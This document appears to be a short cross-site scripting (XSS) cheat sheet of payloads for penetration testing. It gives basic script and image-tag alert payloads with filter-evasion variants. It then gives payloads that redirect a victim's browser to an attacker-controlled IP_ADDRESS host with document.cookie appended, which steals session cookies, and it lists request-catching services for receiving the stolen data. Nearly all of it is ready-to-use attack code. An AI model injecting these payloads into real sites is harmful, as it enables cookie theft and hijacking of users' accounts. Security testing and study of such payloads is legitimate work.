# XSS

## Basic

```html
<script>alert("XXS");</script>
<script>alert(document.domain);</script>
<script>alert(document.origin);</script>

<IMG SRC="javascript:alert('XSS');">
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>

<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
```

## Test remote connection

```html
<script>
document.location='https://IP_ADDRESS/test.php'
</script>
```

Image:

```html
<img src='http://IP_ADDRESS/test></img>
```

## Grab cookie

```html
<script>
document.location='http://IP_ADDRESS/test.php?id=' + document.cookie
</script>
```

Image:

```html
<script>document.write("<img src='http://IP_ADDRESS/test?=".concat(document.cookie,"'", "></img>"))</script>
```

## Remote host

HTTP:

- <http://requestbin.net>
- <https://pipedream.com>

DNS:

- <http://dnslog.cn>
- <https://requestbin.net/dns>

## Sources

- <https://owasp.org/www-community/xss-filter-evasion-cheatsheet>
